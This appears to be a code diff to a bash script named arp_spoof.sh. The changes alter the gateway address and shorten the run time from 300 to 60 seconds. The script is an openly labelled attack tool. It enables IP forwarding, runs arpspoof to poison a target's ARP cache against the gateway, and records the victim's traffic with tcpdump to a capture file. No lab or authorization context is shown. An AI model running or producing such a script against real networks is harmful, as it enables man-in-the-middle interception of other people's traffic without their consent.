@@ -3,7 +3,7 @@
 # arp_spoof.sh
 TARGET_IP=$1
 LOG_FILE="/home/rb/arp_attack_logs.txt"
-GATEWAY_IP="192.168.11.1"  # Adjust to your network
+GATEWAY_IP="172.30.112.1"  # Adjust to your network
 
 # Function to log messages
 log_message() {
@@ -28,7 +28,7 @@ log_message "Enabled IP forwarding"
 
 # Start ARP spoofing
 log_message "Starting ARP spoofing attack against $TARGET_IP"
-timeout 300 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
+timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
 SPOOF_PID=$!
 
 # Monitor and log traffic
@@ -37,7 +37,7 @@ tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
 TCPDUMP_PID=$!
 
 # Run for 5 minutes
-sleep 300
+sleep 60
 
 # Cleanup
 kill $SPOOF_PID
